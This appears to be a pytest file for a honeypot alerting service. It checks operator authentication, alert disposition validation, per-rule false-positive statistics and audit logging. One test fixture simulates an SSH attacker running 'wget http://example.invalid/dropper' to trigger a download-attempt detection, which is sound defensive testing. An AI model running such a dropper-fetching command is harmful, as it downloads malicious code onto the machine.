from __future__ import annotations

from aegis_nexus.app import create_app


def _client(tmp_path):
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "sensor-secret",
        "OPERATOR_API_KEY": "operator-secret",
    })
    return app.test_client()


def _ingest_download_attempt(client, source_ip="203.0.113.40"):
    response = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "sensor-secret"},
        json={
            "honeypot": "ssh-1",
            "event_type": "command",
            "observed": {
                "source_ip": source_ip,
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": "wget http://example.invalid/dropper",
            },
        },
    )
    assert response.status_code == 201


def test_detection_stats_require_operator(tmp_path):
    client = _client(tmp_path)
    assert client.get("/api/v1/detections/stats").status_code == 401


def test_alert_disposition_validates_and_feeds_per_rule_statistics(tmp_path):
    client = _client(tmp_path)
    operator = {"X-Aegis-Operator-Key": "operator-secret"}
    _ingest_download_attempt(client)

    alert = client.get("/api/v1/alerts", headers=operator).get_json()["items"][0]
    assert alert["rule_id"] == "download_attempt"
    assert alert.get("disposition") is None

    # Before any disposition: hit count present, no false-positive rate yet.
    stats = client.get("/api/v1/detections/stats", headers=operator).get_json()
    rule = next(r for r in stats["rules"] if r["rule_id"] == "download_attempt")
    assert rule["alerts"] == 1
    assert rule["open"] == 1
    assert rule["false_positive_rate"] is None
    assert "not ground truth" in stats["caveat"]

    # Invalid disposition is rejected.
    bad = client.patch(
        f"/api/v1/alerts/{alert['id']}",
        headers=operator,
        json={"disposition": "totally_bogus"},
    )
    assert bad.status_code == 422

    # Valid false-positive disposition persists and flows into statistics.
    patched = client.patch(
        f"/api/v1/alerts/{alert['id']}",
        headers=operator,
        json={"status": "closed", "disposition": "false_positive"},
    )
    assert patched.status_code == 200
    assert patched.get_json()["disposition"] == "false_positive"

    stats = client.get("/api/v1/detections/stats", headers=operator).get_json()
    rule = next(r for r in stats["rules"] if r["rule_id"] == "download_attempt")
    assert rule["dispositions"]["false_positive"] == 1
    assert rule["closed"] == 1
    assert rule["false_positive_rate"] == 1.0


def test_disposition_change_is_audited(tmp_path):
    client = _client(tmp_path)
    operator = {"X-Aegis-Operator-Key": "operator-secret"}
    _ingest_download_attempt(client)
    alert = client.get("/api/v1/alerts", headers=operator).get_json()["items"][0]

    client.patch(
        f"/api/v1/alerts/{alert['id']}",
        headers=operator,
        json={"disposition": "true_positive"},
    )
    audit = client.get("/api/v1/audit", headers=operator).get_json()
    updates = [e for e in audit["items"] if e["action"] == "alert.update"]
    assert any(e["detail"].get("disposition") == "true_positive" for e in updates)
